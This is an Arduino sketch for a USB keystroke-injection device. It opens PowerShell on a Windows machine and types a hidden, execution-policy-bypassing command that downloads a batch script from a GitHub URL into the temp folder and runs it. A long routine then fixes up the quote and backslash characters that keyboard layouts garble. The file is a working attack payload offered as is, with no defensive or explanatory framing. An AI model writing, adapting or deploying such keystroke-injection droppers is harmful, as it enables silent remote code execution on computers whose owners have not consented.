#include <HIDKeyboard.h>
HIDKeyboard keyboard;  // Initialize HIDKeyboard object


uint8_t buf[8] = {
  0
};
void script();

void setup() {
  keyboard.begin();  // Start communication
  delay(200);
}

void loop() {
  script();
}

void deplaceefface(int dep) {
  for (int i = 0; i < dep; i++) {
    keyboard.pressSpecialKey(LEFTARROW);
    keyboard.releaseKey();
  }
  keyboard.pressSpecialKey(BACKSPACE);
  keyboard.releaseKey();
}

void reparescript() {

  delay(1000);

  keyboard.pressSpecialKey(LEFTARROW);
  keyboard.releaseKey();
  keyboard.pressSpecialKey(BACKSPACE);
  keyboard.releaseKey();
  buf[2] = 0x34;         // ' key
  Serial.write(buf, 8);  // Send keypress
  keyboard.releaseKey();


  deplaceefface(15);
  buf[2] = 0x64;         // \ key
  Serial.write(buf, 8);  // Send keypress
  keyboard.releaseKey();


  deplaceefface(10);
  buf[2] = 0x34;         // ' key
  Serial.write(buf, 8);  // Send keypress
  keyboard.releaseKey();

  keyboard.pressSpecialKey(LEFTARROW);  //1
  keyboard.releaseKey();

  keyboard.pressSpecialKey(BACKSPACE);
  keyboard.releaseKey();
  buf[2] = 0x36;         // , key
  Serial.write(buf, 8);  // Send keypress
  keyboard.releaseKey();

  keyboard.pressSpecialKey(LEFTARROW);  //1
  keyboard.releaseKey();
  keyboard.pressSpecialKey(BACKSPACE);
  keyboard.releaseKey();
  buf[2] = 0x34;         // ' key
  Serial.write(buf, 8);  // Send keypress
  keyboard.releaseKey();

  deplaceefface(3);
  buf[2] = 0x34;         // ' key
  Serial.write(buf, 8);  // Send keypress
  keyboard.releaseKey();

  deplaceefface(16);
  buf[2] = 0x34;         // ' key
  Serial.write(buf, 8);  // Send keypress
  keyboard.releaseKey();

  deplaceefface(4);
  buf[2] = 0x34;         // ' key
  Serial.write(buf, 8);  // Send keypress
  keyboard.releaseKey();

  deplaceefface(18);
  buf[2] = 0x34;         // ' key
  Serial.write(buf, 8);  // Send keypress
  keyboard.releaseKey();

  deplaceefface(15);
  buf[2] = 0x64;         // \ key
  Serial.write(buf, 8);  // Send keypress
  keyboard.releaseKey();

  deplaceefface(10);
  buf[2] = 0x34;         // ' key
  Serial.write(buf, 8);  // Send keypress
  keyboard.releaseKey();

  deplaceefface(2);
  buf[2] = 0x36;         // , key
  Serial.write(buf, 8);  // Send keypress
  keyboard.releaseKey();


  keyboard.pressSpecialKey(LEFTARROW);  //3
  keyboard.releaseKey();

  keyboard.pressSpecialKey(BACKSPACE);
  keyboard.releaseKey();
  buf[2] = 0x34;         // ' key
  Serial.write(buf, 8);  // Send keypress
  keyboard.releaseKey();

  deplaceefface(81);
  buf[2] = 0x34;         // ' key
  Serial.write(buf, 8);  // Send keypress
  keyboard.releaseKey();

  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();

  while (1)
    ;
}


void script() {

  delay(10);
  keyboard.pressSpecialKey(GUI);  // Press the GUI (Windows) key
  keyboard.releaseKey();          // Release the GUI key

  delay(1000);
  keyboard.print("powershell");
  delay(1000);
  keyboard.pressSpecialKey(ENTER);
  delay(100);
  keyboard.releaseKey();
  delay(1000);

  //commande bash qui marche,
  keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass @(New-Object System.Net.WebClient).DownloadFile(*https://raw.githubusercontent.com/TcLVG/ShadowStrike/Elohyrr-patch-2/script1.txt*, *$env:temp\\testscript.bat*); Start-Process *cmd* -ArgumentList */c*,*$env:temp\\testscript.bat*@");

  reparescript();
}